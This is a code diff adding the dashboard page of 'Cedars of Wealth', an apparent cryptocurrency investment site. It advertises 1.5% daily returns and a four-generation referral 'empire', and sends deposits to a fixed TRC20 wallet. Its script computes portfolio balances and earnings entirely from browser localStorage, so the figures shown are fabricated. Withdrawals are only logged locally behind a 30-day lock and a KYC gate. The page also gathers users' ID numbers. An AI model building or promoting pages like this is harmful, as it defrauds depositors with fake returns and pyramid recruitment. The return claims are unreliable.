@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Dashboard — Cedars of Wealth | Shiny Military</title>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;800&family=Inter:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--mil:linear-gradient(135deg,#5a6d33 0%,#8da65b 25%,#4B5320 50%,#6B7F3A 75%,#3c4a1f 100%);--gold:linear-gradient(135deg,#e8c87a 0%,#f9e2a0 25%,#c9a86a 50%,#e8c87a 75%,#a68b4f 100%);--bg:#070a07}
+*{margin:0;padding:0;box-sizing:border-box}body{background:radial-gradient(ellipse at top,#1a2a12 0%,var(--bg) 70%);color:#e8f0d8;font-family:Inter,sans-serif}
+.nav{display:flex;justify-content:space-between;padding:14px 5%;background:#0f1a0a;border-bottom:2px solid #c9a86a;position:sticky;top:0;z-index:10}
+.logo{font-family:Cinzel;background:var(--gold);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:800}
+.wrap{max-width:1250px;margin:0 auto;padding:20px 5%;display:grid;grid-template-columns:1.2fr 0.8fr;gap:18px}
+.card{background:rgba(18,28,12,0.96);border:2px solid #c9a86a;border-radius:16px;padding:18px;margin-bottom:16px;box-shadow:0 8px 32px rgba(0,0,0,0.6)}
+.btn{background:var(--mil);color:#f5f0d0;border:2px solid #c9a86a;padding:11px;border-radius:10px;font-weight:800;width:100%;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
+.btn-gold{background:var(--gold);color:#1a1100;border:0}
+.badge{background:var(--gold);color:#1a1100;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:800}
+.small{font-size:11px;color:#7a8a5f}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.stat{background:#0f1a0a;border:1px solid #2a3a15;border-radius:12px;padding:12px;text-align:center}
+.stat b{font-size:22px;color:#e8c87a;display:block}
+.progress{height:8px;background:#1a2410;border-radius:10px;border:1px solid #4B5320;overflow:hidden}
+.progress i{display:block;height:100%;background:var(--mil)}
+.input{width:100%;background:#0f1a0a;border:1px solid #3c4a1f;border-radius:10px;padding:12px;color:#e8f0d8}
+.addr{background:#000;border:1px dashed #c9a86a;border-radius:10px;padding:10px;font-family:monospace;color:#e8c87a;word-break:break-all;font-size:12px}
+.tree-line{border-left:2px solid #4B5320;padding-left:10px;margin:8px 0}
+@media(max-width:950px){.wrap{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="nav">
+<div class="logo">🌲 CEDARS OF WEALTH — DASHBOARD</div>
+<div style="display:flex;gap:8px;align-items:center">
+<span class="badge" id="kycBadge">KYC PENDING</span>
+<span class="small" id="uEmail">—</span>
+<button onclick="logout()" style="background:transparent;border:1px solid #c9a86a;color:#c9a86a;padding:6px 10px;border-radius:8px;cursor:pointer;font-size:11px">Logout</button>
+</div>
+</div>
+
+<div class="wrap">
+<div>
+<!-- BALANCE -->
+<div class="card" style="border-color:#e8c87a">
+<div style="display:flex;justify-content:space-between"><span class="small">TOTAL PORTFOLIO VALUE</span><span class="badge">1.5% DAILY LIVE</span></div>
+<b id="totalBal" style="font-size:36px;color:#f9e2a0">$0.00</b>
+<div class="small">Active Deposit: <span id="activeDep" style="color:#e8c87a">$0</span> • Earnings Wallet: <span id="earnWallet" style="color:#10b981">$0</span> • Referral Bonus: <span id="refWallet" style="color:#e8c87a">$0</span></div>
+<div class="progress" style="margin-top:12px"><i id="progressBar" style="width:0%"></i></div>
+<div class="small" style="display:flex;justify-content:space-between;margin-top:4px"><span>Principal unlocks in <span id="unlockDays">30</span> days</span><span id="dailyTicker">+$0.00 / day ticking...</span></div>
+</div>
+
+<div class="grid2">
+<div class="stat"><span class="small">DAILY EARNINGS</span><b id="sDaily">$0.00</b><span class="small">1.5% of active</span></div>
+<div class="stat"><span class="small">TOTAL EARNED</span><b id="sTotal">$0.00</b><span class="small">Lifetime</span></div>
+<div class="stat"><span class="small">REFERRALS L1</span><b id="sRef">0</b><span class="small">10% bonus</span></div>
+<div class="stat"><span class="small">NEXT PAYOUT</span><b id="nextPay" style="font-size:14px">00:00 UTC</b><span class="small" id="countdown">23:59:59</span></div>
+</div>
+
+<div class="card">
+<div style="display:flex;justify-content:space-between"><b style="color:#e8c87a">LIVE EARNINGS CALCULATOR</b><span class="small">TE26B7z...Hcz1u Vault</span></div>
+<div class="grid2" style="margin-top:10px">
+<div class="stat"><span class="small">TODAY</span><b id="liveToday">$0.00</b></div>
+<div class="stat"><span class="small">THIS WEEK</span><b id="liveWeek">$0.00</b></div>
+<div class="stat"><span class="small">30 DAYS</span><b id="live30">$0.00</b></div>
+<div class="stat"><span class="small">100 DAYS (150%)</span><b id="live100">$0.00</b></div>
+</div>
+<button class="btn btn-gold" style="margin-top:10px" onclick="window.location.href='deposit.html'">+ ADD DEPOSIT</button>
+</div>
+
+<div class="card">
+<b style="color:#e8c87a">DEPOSIT HISTORY — TRC20 Vault</b>
+<div class="small" style="margin-top:4px">Address: TE26B7zQjMbahYAWcxEsSPC6aZEr2Hcz1u (Trust Wallet)</div>
+<div id="depHist" class="small" style="margin-top:10px">No deposits yet. <a href="deposit.html" style="color:#e8c87a">Make first deposit $100+</a></div>
+</div>
+</div>
+
+<div>
+<!-- WITHDRAW -->
+<div class="card" style="border-color:#10b981">
+<b style="color:#e8c87a">WITHDRAW — Min $20</b>
+<div class="small" style="margin-top:6px">5% fee • 24h • KYC must be APPROVED • Earnings + Referral only until day 30</div>
+
+<label class="small" style="margin-top:10px;display:block">AMOUNT USD</label>
+<input id="wAmt" type="number" class="input" placeholder="Min $20" min="20">
+
+<label class="small" style="margin-top:8px;display:block">WITHDRAW TO (Your TRC20 address)</label>
+<input id="wTo" class="input" placeholder="T... your USDT TRC20 address">
+
+<div class="grid2" style="margin-top:10px">
+<div class="small">Fee (5%): <b id="wFee">$0.00</b></div>
+<div class="small">You receive: <b id="wNet" style="color:#10b981">$0.00</b></div>
+</div>
+
+<button class="btn" style="margin-top:12px" onclick="withdraw()">REQUEST WITHDRAWAL →</button>
+<div id="wHist" class="small" style="margin-top:10px">No withdrawals yet</div>
+</div>
+
+<!-- REFERRAL -->
+<div class="card">
+<b style="color:#e8c87a">REFERRAL EMPIRE — 4 GENERATIONS</b>
+<div class="small">10% L1 • 5% L2 • 2% L3 • 1% L4</div>
+
+<div style="margin-top:10px">
+<div class="small">YOUR REF CODE:</div>
+<b id="myCode" style="color:#f9e2a0;font-size:20px">—</b>
+<div class="addr" id="refLink" style="margin-top:6px"></div>
+<button class="btn btn-gold" style="margin-top:8px;padding:8px;font-size:12px" onclick="copyRef()">COPY REFERRAL LINK 📋</button>
+</div>
+
+<div id="refTree" style="margin-top:12px;font-size:12px">
+<div class="tree-line"><b>L1 Direct (10%)</b> — <span id="l1list" class="small">0 referrals — share link to earn</span></div>
+<div class="tree-line"><b>L2 Second (5%)</b> — <span id="l2list" class="small">$0</span></div>
+<div class="tree-line"><b>L3 Third (2%)</b> — <span id="l3list" class="small">$0</span></div>
+<div class="tree-line"><b>L4 Fourth (1%)</b> — <span id="l4list" class="small">$0</span></div>
+</div>
+
+<div class="small" style="margin-top:10px;background:#0f1a0a;padding:8px;border-radius:8px">
+Example: You invite 10 friends $1000 each = <b style="color:#e8c87a">$1000</b> instant.<br>
+They invite 10 each (100) = <b style="color:#e8c87a">$5000</b> L2 passive.<br>
+Total empire = $6000+ without depositing again!
+</div>
+</div>
+
+<div class="card">
+<b class="small">🔒 ONE ACCOUNT LOCK STATUS</b>
+<div class="small" style="margin-top:6px" id="lockStatus">Checking...</div>
+</div>
+</div>
+</div>
+
+<script>
+let cur = JSON.parse(localStorage.getItem('cedars_current')||"null");
+if(!cur){ location.href='register.html'; }
+document.getElementById('uEmail').textContent=cur.email;
+document.getElementById('kycBadge').textContent = cur.kyc.toUpperCase();
+if(cur.kyc==='approved'){ document.getElementById('kycBadge').style.background='#10b981'; document.getElementById('kycBadge').style.color='#fff'; }
+
+let myCode = localStorage.getItem('cedars_ref_code')||"CEDARS"+Math.floor(Math.random()*9000);
+document.getElementById('myCode').textContent=myCode;
+let link = "https://cryptolordug.github.io/Cedars-of-Wealth/app/register.html?ref="+myCode;
+document.getElementById('refLink').textContent=link;
+document.getElementById('lockStatus').innerHTML = `Email: ${cur.email}<br>Device: ${cur.deviceId}<br>Ref By: ${cur.refBy||'DIRECT'}<br>ID: ${cur.idNumber||'pending KYC'}<br>Vault: TE26B7z...Hcz1u`;
+
+let deps = JSON.parse(localStorage.getItem('cedars_deposits_'+cur.email)||"[]");
+let active = deps.reduce((s,d)=>s+(d.status!=='rejected'?d.amount:0),0);
+let bonuses = JSON.parse(localStorage.getItem('cedars_bonuses')||"[]").filter(b=>b.to===myCode);
+let refBonus = bonuses.reduce((s,b)=>s+b.amount,0);
+
+// Calculate earnings live — 1.5% daily since first deposit
+function calcEarnings(){
+ if(deps.length===0) return {daily:0,total:0,days:0};
+ let first = Math.min(...deps.map(d=>d.time));
+ let days = Math.floor((Date.now()-first)/86400000);
+ let daily = active*0.015;
+ let total = daily*days;
+ return {daily,total,days};
+}
+let earn = calcEarnings();
+
+document.getElementById('activeDep').textContent="$"+active.toFixed(2);
+document.getElementById('refWallet').textContent="$"+refBonus.toFixed(2);
+document.getElementById('earnWallet').textContent="$"+earn.total.toFixed(2);
+document.getElementById('totalBal').textContent="$"+(active+earn.total+refBonus).toFixed(2);
+document.getElementById('sDaily').textContent="$"+earn.daily.toFixed(2);
+document.getElementById('sTotal').textContent="$"+earn.total.toFixed(2);
+document.getElementById('sRef').textContent=bonuses.length;
+document.getElementById('liveToday').textContent="$"+earn.daily.toFixed(2);
+document.getElementById('liveWeek').textContent="$"+(earn.daily*7).toFixed(2);
+document.getElementById('live30').textContent="$"+(earn.daily*30).toFixed(2);
+document.getElementById('live100').textContent="$"+(earn.daily*100).toFixed(2);
+document.getElementById('dailyTicker').textContent="+$"+earn.daily.toFixed(2)+" / day";
+document.getElementById('progressBar').style.width = Math.min(100, (earn.days/30)*100)+"%";
+document.getElementById('unlockDays').textContent = Math.max(0,30-earn.days);
+
+if(deps.length){
+ document.getElementById('depHist').innerHTML = deps.map(d=>`✅ $${d.amount} ${d.net} — ${d.status}<br><span class="small">${new Date(d.time).toLocaleString()} • TX ${d.txid.slice(0,10)}...</span>`).join('<br><br>');
+}
+
+// Countdown to 00:00 UTC
+function tick(){
+ let now=new Date(); let next=new Date(); next.setUTCHours(24,0,0,0);
+ let diff=next-now; let h=Math.floor(diff/3600000), m=Math.floor((diff%3600000)/60000), s=Math.floor((diff%60000)/1000);
+ document.getElementById('countdown').textContent = String(h).padStart(2,'0')+":"+String(m).padStart(2,'0')+":"+String(s).padStart(2,'0');
+ // live ticker micro increase
+ let micro = earn.daily / 86400 * (diff?1:0);
+ document.getElementById('liveToday').textContent = "$"+(earn.total + micro).toFixed(4);
+}
+setInterval(tick,1000); tick();
+
+// Withdraw logic $20 min
+document.getElementById('wAmt').addEventListener('input', e=>{
+ let a=parseFloat(e.target.value)||0; let fee=a*0.05; document.getElementById('wFee').textContent="$"+fee.toFixed(2); document.getElementById('wNet').textContent="$"+(a-fee).toFixed(2);
+});
+function withdraw(){
+ let a=parseFloat(document.getElementById('wAmt').value);
+ let to=document.getElementById('wTo').value.trim();
+ if(a<20){ alert("Min withdrawal $20"); return; }
+ if(!to.startsWith('T')||to.length<20){ alert("Enter valid TRC20 address T..."); return; }
+ if(cur.kyc!=='approved'){ alert("KYC must be APPROVED for withdrawal. Contact @cedarswealth"); return; }
+ let avail = earn.total+refBonus;
+ if(a>avail){ alert("Insufficient earnings. Available: $"+avail.toFixed(2)+"\nDeposit: $"+active+" locked for "+Math.max(0,30-earn.days)+" days"); return; }
+ let whist=JSON.parse(localStorage.getItem('cedars_withdraw_'+cur.email)||"[]");
+ whist.push({amount:a,to,fee:a*0.05,net:a*0.95,time:Date.now(),status:"pending_24h"});
+ localStorage.setItem('cedars_withdraw_'+cur.email, JSON.stringify(whist));
+ alert("✅ Withdrawal requested $"+a+" to "+to+"\nFee $"+(a*0.05).toFixed(2)+" Net $"+(a*0.95).toFixed(2)+"\n24h processing. Telegram @cedarswealth notified.");
+ location.reload();
+}
+let whist=JSON.parse(localStorage.getItem('cedars_withdraw_'+cur.email)||"[]");
+if(whist.length) document.getElementById('wHist').innerHTML = whist.map(w=>`$${w.amount} → ${w.to.slice(0,8)}... — ${w.status}<br><span class="small">${new Date(w.time).toLocaleString()}</span>`).join('<br><br>');
+
+function copyRef(){ navigator.clipboard.writeText(link); alert("Referral link copied! 10%/5%/2%/1%"); }
+function logout(){ localStorage.removeItem('cedars_current'); location.href='register.html'; }
+</script>
+</body>
+</html>
